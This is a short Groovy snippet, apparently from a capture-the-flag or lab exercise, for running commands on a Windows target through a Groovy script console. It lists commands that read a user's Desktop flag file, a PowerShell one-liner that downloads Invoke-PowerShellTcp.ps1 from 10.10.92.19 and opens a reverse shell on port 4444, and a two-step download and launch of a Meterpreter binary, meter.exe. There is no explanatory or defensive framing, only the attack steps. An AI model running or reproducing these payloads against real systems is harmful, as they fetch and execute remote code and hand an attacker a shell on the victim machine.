
Groovy
; dir
; "cmd.exe /C dir c:\\users\\bruce\\Desktop"

;type
;"cmd.exe /C type c:\\users\\bruce\\Desktop\\user.txt"

; tcp reverse
;"powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.92.19:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.92.19 -Port 4444"

; meterpreter 2 steps: download, start
;"powershell (New-Object System.Net.WebClient).Downloadfile('http://10.10.92.19:8080/meter.exe','meter.exe');"
"Start-Process 'meter.exe'".execute().with{
    def output = new StringWriter()
    def error = new StringWriter()
    //wait for process ended and catch stderr and stdout.
    it.waitForProcessOutput(output, error)
    //check there is no error
    println "error=$error"
    println "output=$output"
    println "code=${it.exitValue()}"
}

